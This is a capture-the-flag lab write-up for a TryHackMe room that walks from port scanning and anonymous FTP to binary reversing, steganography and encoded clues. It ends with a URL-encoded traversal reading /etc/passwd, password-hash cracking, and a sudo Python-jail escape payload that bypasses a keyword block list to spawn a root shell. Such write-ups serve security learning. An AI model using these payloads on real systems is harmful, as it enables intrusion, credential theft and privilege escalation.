---

Name: Tokyo Ghoul
Difficulty: Medium
URL: https://tryhackme.com/room/tokyoghoul666
Description: Help kaneki escape jason room 

---

# Where am I?

## How many ports are open?

Running a RustScan/Nmap scan:

```bash
$ rustscan -a ghoul.thm -r 1-65535 --ulimit 5000 -- -sC -sV

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

Three TCP ports are open:

* `21` — FTP
* `22` — SSH
* `80` — HTTP

FTP also allows anonymous login.

## What is the OS used?

The service information shows that the machine is running **Ubuntu**.

---

# Planning to escape

## Did you find the note that the other ghouls gave you? Where did you find it?

Looking at the source code of the website reveals an HTML comment:

```html
<!-- look don't tell jason but we will help you escape we will give you the key to open those chains and here is some clothes to look like us and a mask to look anonymous and go to the ftp room right there -->
```

There is another note inside `jasonroom.html`:

```html
<!-- look don't tell jason but we will help you escape , here is some clothes to look like us and a mask to look anonymous and go to the ftp room right there you will find a freind who will help you -->
```

So the answer is:

```text
jasonroom.html
```

## What is the key for Rize executable?

Since anonymous FTP login is enabled, we can enumerate the available files:

```bash
$ ftp ghoul.thm
Connected to 10.112.152.86.
220 (vsFTPd 3.0.3)
Name (ghoul.thm:theo): anonymous
230 Login successful.
```

Inside the FTP server:

```text
ftp> ls
drwxr-xr-x    3 ftp ftp 4096 Jan 23 2021 need_Help?

ftp> cd need_Help?
ftp> ls
-rw-r--r--    1 ftp ftp  480 Jan 23 2021 Aogiri_tree.txt
drwxr-xr-x    2 ftp ftp 4096 Jan 23 2021 Talk_with_me
```

Inside `Talk_with_me`:

```text
ftp> cd Talk_with_me
ftp> ls
-rwxr-xr-x    1 ftp ftp 17488 Jan 23 2021 need_to_talk
-rw-r--r--    1 ftp ftp 46674 Jan 23 2021 rize_and_kaneki.jpg
```

We download the files:

```text
ftp> get Aogiri_tree.txt
ftp> get need_to_talk
ftp> get rize_and_kaneki.jpg
```

The text file gives us some context:

```text
Why are you so late?? i've been waiting for too long .
So i heard you need help to defeat Jason , so i'll help you to do it and i know you are wondering how i will.
I knew Rize San more than anyone and she is a part of you, right?
That mean you got her kagune , so you should activate her Kagune and to do that you should get all control to your body , i'll help you to know Rise san more and get her kagune , and don't forget you are now a part of the Aogiri tree .
Bye Kaneki.
```

The interesting file is the executable:

```bash
$ ./need_to_talk

Hey Kaneki finnaly you want to talk
Unfortunately before I can give you the kagune you need to give me the paraphrase
Do you have what I'm looking for?

> no
Hmm. I don't think this is what I was looking for.
Take a look inside of me. rabin2 -z
```

The message tells us to inspect the binary. I used Ghidra to understand what the program is doing:

```c
bool check_password(void)

{
  int ok;
  size_t length;
  undefined8 uStack_110;
  char input [256];

  uStack_110 = 0x101305;
  printf("> ");
  uStack_110 = 0x101320;
  fgets(input,0xff,stdin);
  uStack_110 = 0x10132f;
  length = strlen(input);
  input[length - 1] = '\0';
  uStack_110 = 0x101354;
  ok = strcmp(input,the_password);
  return ok == 0;
}
```

The important part is:

```c
strcmp(input, the_password);
```

We can inspect `the_password` with GDB:

```bash
(gdb) p (char *)the_password
$5 = 0x555555556008 "kamishiro"
```

Therefore the password is:

```text
kamishiro
```

Running the program again:

```bash
$ ./need_to_talk

Hey Kaneki finnaly you want to talk
Unfortunately before I can give you the kagune you need to give me the paraphrase
Do you have what I'm looking for?

> kamishiro

Good job. I believe this is what you came for:
You_found_1t
```

We have now found the passphrase:

```text
You_found_1t
```

---

# Use a tool to get the other note from Rize

We can use the passphrase to extract hidden data from the JPEG with `steghide`:

```bash
$ steghide extract -sf rize_and_kaneki.jpg
Enter passphrase:
wrote extracted data to "yougotme.txt".
```

---

# What is Rize trying to say?

## What does the message mean?

The extracted file contains:

```bash
$ cat yougotme.txt

haha you are so smart kaneki but can you talk my code

..... .-
....- ....-
....- -....
--... ----.
....- -..
...-- ..---
....- ..---
...-- ...--
....- -..
....- ---..
....- .-
...-- .....
..... ---..
...-- ..---
....- .
-.... -.-.
-.... ..---
-.... .
..... ..---
-.... -.-.
-.... ...--
-.... --...
...-- -..
...-- -..

if you can talk it allright you got my secret directory
```

This is Morse code. Decoding it gives us:

```text
5A 44 46 79 4D 32 4D 33 4D 48 4A 35 58 32 4E 6C 62 6E 52 6C 63 67 3D 3D
```

This is hexadecimal, so we decode it:

```text
ZDFyM2M3MHJ5X2NlbnRlcg==
```

The result is Base64. Decoding that gives:

```text
d1r3c70ry_center
```

So we have found a hidden directory:

```text
/d1r3c70ry_center/
```

---

# Can you see the weakness in the dark? No? Just search

We visit:

```text
http://ghoul.thm/d1r3c70ry_center/
```

Let's enumerate the directory:

```bash
$ gobuster dir -url http://ghoul.thm/d1r3c70ry_center/ \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
-t 100 -x txt,php,html,bak,zip,log,old,js -k
```

We find:

```text
claim                (Status: 301)
```

Visiting it takes us to:

```text
http://ghoul.thm/d1r3c70ry_center/claim/
```

The page contains:

```text
index.php?view=flower.gif
```

This looks interesting because the application is taking a filename through the `view` parameter.

## Testing for LFI

A normal path traversal attempt:

```text
?view=../../../../../etc/passwd
```

returns:

```text
no no no silly don't do that
```

So there appears to be a filter blocking the obvious traversal characters.

We can bypass the filter by URL-encoding the traversal characters:

```bash
curl 'http://ghoul.thm/d1r3c70ry_center/claim/index.php?view=%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd'
```

The application then returns `/etc/passwd`.

The important entry is:

```text
kamishiro:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:1001:1001:,,,:/home/kamishiro:/bin/bash
```

The `$6$` prefix indicates a SHA-512 crypt password hash.

---

## What is Rize's username?

From `/etc/passwd`:

```text
kamishiro
```

So the username is:

```text
kamishiro
```

## What is Rize's password?

We can crack the hash with John the Ripper.

First, save the relevant entry:

```bash
echo 'kamishiro:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:1001:1001:,,,:/home/kamishiro:/bin/bash' > hash.txt
```

Then:

```bash
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

password123      (kamishiro)
```

The credentials are therefore:

```text
Username: kamishiro
Password: password123
```

---

# Fight Jason

## User.txt

We can now log in through SSH:

```bash
ssh kamishiro@ghoul.thm
```

Once logged in, we can read the user flag:

```bash
kamishiro@vagrant:~$ cat user.txt
```

---

# Root.txt

We find a `jail.py` file in the home directory:

```bash
kamishiro@vagrant:~$ ls -al
-rw-r--r-- 1 root root 588 Jan 23 2021 jail.py
```

The script asks for Python code and then executes our input:

```python
def main():
    print("Hi! Welcome to my world kaneki")
    print("========================================================================")
    print("What ? You gonna stand like a chicken ? fight me Kaneki")
    text = input('>>> ')
    for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']:
        if keyword in text:
            print("Do you think i will let you do this ??????")
            return
    else:
        exec(text)
        print('No Kaneki you are so dead')

if __name__ == "__main__":
    main()
```

We first check our sudo permissions:

```bash
kamishiro@vagrant:~$ sudo -l

Matching Defaults entries for kamishiro on vagrant.vm:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kamishiro may run the following commands on vagrant.vm:
    (ALL) /usr/bin/python3 /home/kamishiro/jail.py
```

This means we can execute `jail.py` as root.

The problem is that the script contains a blacklist:

```python
['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']
```

However, this is only a **case-sensitive substring check**.

For example, the input:

```text
__IMPORT__
```

does not contain the lowercase string:

```text
import
```

We can exploit this by converting the string to lowercase at runtime.

The final payload is:

```python
__builtins__.__dict__['__IMPORT__'.lower()]('PTY'.lower()).spawn('/bin/bash')
```

### Why does this work?

First:

```python
'__IMPORT__'.lower()
```

becomes:

```text
__import__
```

The blacklist doesn't detect it because the original input contains `IMPORT`, not `import`.

We then use the `__builtins__` dictionary to retrieve the `__import__` function:

```python
__builtins__.__dict__['__import__']
```

Next:

```python
'PTY'.lower()
```

becomes:

```text
pty
```

so Python imports the `pty` module without the word `import` appearing directly in our input.

Finally:

```python
.spawn('/bin/bash')
```

starts a Bash shell.

The important part is that `jail.py` is being executed through `sudo`:

```bash
sudo /usr/bin/python3 /home/kamishiro/jail.py
```

Therefore the Python process is running as root. The Bash shell spawned by Python inherits those privileges.

We can verify this:

```bash
root@vagrant:~# id
uid=0(root) gid=0(root) groups=0(root)
```

We now have a root shell.

Finally:

```bash
root@vagrant:~# cat /root/root.txt
```

And we have the root flag.

